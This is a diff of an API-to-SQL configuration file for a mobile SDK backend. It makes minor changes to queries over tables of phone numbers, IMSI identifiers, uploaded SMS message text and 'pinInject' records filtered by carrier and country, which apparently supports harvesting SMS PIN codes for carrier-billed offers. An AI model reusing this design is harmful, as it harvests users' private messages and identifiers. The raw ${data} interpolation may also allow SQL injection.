@@ -34,9 +34,9 @@ GET /api/visit/getUrls: SELECT  url,COUNT(DISTINCT requestId) AS counts FROM vis
 #INSERT INTO permissionCollect (userId,requestId,canNotify,networkType,phoneGetType,phone,imsi) VALUES (${data.userId},${data.requestId},CONVERT(${data.canNotify},SIGNED),CONVERT(${data.networkType},SIGNED),@{data.phoneGetType},${data.phone},${data.imsi});
 #POST /api/permissions/getIde:
 #INSERT INTO permissionCollects (userId,requestId,canNotify,networkType,phoneGetType,phone,imsi) VALUES (${data.userId},${data.requestId},CONVERT(${data.canNotify},SIGNED),CONVERT(${data.networkType},SIGNED),@{data.phoneGetType},${data.phone},${data.imsi});
-#获取appId
-GET /api/permissions/getAppId: SELECT appId FROM sdkOfferCollect GROUP BY appId;
-#获取offerId 根据运营商和appid  以及国家
+#获取 下拉 offer信息
+GET /api/permissions/getAppId: SELECT DISTINCT appId,offerId FROM sdkOfferCollect;
+#获取offerId 根据运营商和offerID  以及国家
 GET /api/permissions/getOfferId: SELECT s.offerId,s.appId,p.carrier FROM (SELECT carrier,requestId FROM permissionCollect WHERE !ISNULL(carrier) AND carrier=IF(${data.carrier}='',carrier,${data.carrier}) AND country = IF(${data.country} = '',country,${data.country})) p LEFT JOIN (SELECT offerId,requestId,appId FROM sdkOfferCollect WHERE appId=${data.appId} GROUP BY requestId) s ON s.requestId = p.requestId WHERE !ISNULL(s.offerId) GROUP BY s.offerId;
 #根据request查询请求条数
 GET /api/permissions/seacher: |
@@ -69,8 +69,8 @@ POST /api/pinInject/getIde: INSERT INTO pinInjectCollect (requestId,pinInject,up
 #短信搜索
 GET /api/pinInject/getMassages: SELECT appId,ps.requestId,offerId,userId,p.pinInject,message,uploadTime FROM (SELECT appId,requestId,offerId,userId,message,FROM_UNIXTIME(uploadTime/1000, '%Y-%m-%d %H:%i:%S') AS uploadTime FROM pinCodeCollect WHERE appId = ${data.appId} AND offerId =IF(${data.offerId}='',offerId,${data.offerId}) AND uploadTime < @{data.timeEnd} AND uploadTime >= @{data.timeStart} ORDER BY uploadTime DESC,userId) ps LEFT JOIN (SELECT pinInject,requestId FROM  pinInjectCollect) p ON p.requestId =ps.requestId;
 #根据APPid 获取运营商
-GET /api/permissions/getCarrier: 
-  SELECT p.carrier,s.appId FROM (SELECT carrier,requestId FROM permissionCollect WHERE !ISNULL(carrier)) p LEFT JOIN (SELECT appId,requestId FROM sdkOfferCollect WHERE appId = ${data.appId}) s ON s.requestId = p.requestId WHERE !ISNULL(s.appId) GROUP BY p.carrier;
+#GET /api/permissions/getCarrier: 
+# SELECT p.carrier,s.appId FROM (SELECT carrier,requestId FROM permissionCollect WHERE !ISNULL(carrier)) p LEFT JOIN (SELECT appId,requestId FROM sdkOfferCollect WHERE appId = ${data.appId}) s ON s.requestId = p.requestId WHERE !ISNULL(s.appId) GROUP BY p.carrier;
 #根据 appid 获取国家
 GET /api/permissions/getCountry:
   SELECT s.offerId,s.appId,p.carrier,p.country,s.requestId FROM(SELECT carrier,requestId,country FROM permissionCollect)p LEFT JOIN(SELECT offerId,requestId,appId FROM sdkOfferCollect WHERE appId=IF(${data.appId}='',appId,${data.appId})GROUP BY requestId)s ON s.requestId=p.requestId WHERE!ISNULL(p.country)AND!ISNULL(s.requestId) GROUP BY p.country;
